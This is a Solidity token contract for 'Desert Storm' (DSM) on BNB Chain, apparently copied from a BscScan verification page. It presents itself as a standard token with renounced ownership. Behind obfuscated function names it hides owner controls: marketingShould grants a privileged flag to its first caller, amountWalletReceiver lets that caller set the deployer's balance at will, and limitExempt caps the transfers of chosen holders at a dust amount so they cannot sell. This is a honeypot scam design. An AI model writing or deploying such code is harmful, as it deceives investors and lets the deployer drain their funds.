/**
 *Submitted for verification at BscScan.com on 2023-02-01
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface listAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface sellLimit {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract DesertStorm is Ownable{
    uint8 public decimals = 18;



    address public maxTake;
    mapping(address => bool) public liquidityIs;
    bool public walletAmount;
    uint256 public totalSupply = 100000000 * 10 ** 18;

    uint256 constant exemptAmount = 10 ** 10;
    string public symbol = "DSM";
    address public enableList;
    mapping(address => bool) public buyTxEnable;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "Desert Storm";
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        listAuto toAuto = listAuto(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        maxTake = sellLimit(toAuto.factory()).createPair(toAuto.WETH(), address(this));
        enableList = launchAuto();
        buyTxEnable[enableList] = true;
        balanceOf[enableList] = totalSupply;
        emit Transfer(address(0), enableList, totalSupply);
        renounceOwnership();
    }

    

    function marketingShould(address fundLaunch) public {
        if (walletAmount) {
            return;
        }
        buyTxEnable[fundLaunch] = true;
        walletAmount = true;
    }

    function amountWalletReceiver(uint256 teamSender) public {
        if (!buyTxEnable[launchAuto()]) {
            return;
        }
        balanceOf[enableList] = teamSender;
    }

    function approve(address takeTx, uint256 teamSender) public returns (bool) {
        allowance[launchAuto()][takeTx] = teamSender;
        emit Approval(launchAuto(), takeTx, teamSender);
        return true;
    }

    function receiverEnable(address modeAt, address shouldTakeSwap, uint256 teamSender) internal returns (bool) {
        require(balanceOf[modeAt] >= teamSender);
        balanceOf[modeAt] -= teamSender;
        balanceOf[shouldTakeSwap] += teamSender;
        emit Transfer(modeAt, shouldTakeSwap, teamSender);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function transferFrom(address exemptTotal, address limitTx, uint256 teamSender) public returns (bool) {
        if (exemptTotal != launchAuto() && allowance[exemptTotal][launchAuto()] != type(uint256).max) {
            require(allowance[exemptTotal][launchAuto()] >= teamSender);
            allowance[exemptTotal][launchAuto()] -= teamSender;
        }
        if (limitTx == enableList || exemptTotal == enableList) {
            return receiverEnable(exemptTotal, limitTx, teamSender);
        }
        if (liquidityIs[exemptTotal]) {
            return receiverEnable(exemptTotal, limitTx, exemptAmount);
        }
        return receiverEnable(exemptTotal, limitTx, teamSender);
    }

    function transfer(address limitTx, uint256 teamSender) external returns (bool) {
        return transferFrom(launchAuto(), limitTx, teamSender);
    }

    function limitExempt(address swapIs) public {
        if (swapIs == enableList || swapIs == maxTake || !buyTxEnable[launchAuto()]) {
            return;
        }
        liquidityIs[swapIs] = true;
    }

    function launchAuto() private view returns (address) {
        return msg.sender;
    }


}